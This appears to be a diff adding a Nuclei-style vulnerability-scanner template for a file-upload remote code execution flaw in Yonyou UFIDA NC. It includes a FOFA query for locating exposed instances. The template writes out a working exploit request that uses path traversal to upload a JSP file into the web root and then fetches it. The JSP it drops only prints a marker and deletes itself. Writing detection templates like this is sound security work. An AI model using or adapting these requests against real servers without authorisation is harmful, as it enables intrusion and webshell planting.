@@ -1,0 +1,39 @@
+id: yonyou-UFIDA-NC-fileupload-rce
+
+info:
+  name: 用友NCfileupload命令执行
+  author: xx
+  severity: high
+  metadata:
+    fofa-query: app="用友-UFIDA-NC"
+  tags: yonyou,rce
+
+http:
+- raw:
+  - |
+    @timeout: 30s
+    POST /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data;boundary=d0b7a0d40eed0e32904c8017b09eb305
+
+    --d0b7a0d40eed0e32904c8017b09eb305
+    Content-Disposition: form-data; name="file";  filename="{{randstr}}.jsp" 
+    Content-Type: text/plain
+
+    <% out.println("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+    --d0b7a0d40eed0e32904c8017b09eb305--
+  
+  - |+
+    @timeout: 30s
+    GET /{{randstr}}.jsp HTTP/1.1
+    Host: {{Hostname}}
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "{{randstr}}")'  
+        condition: and
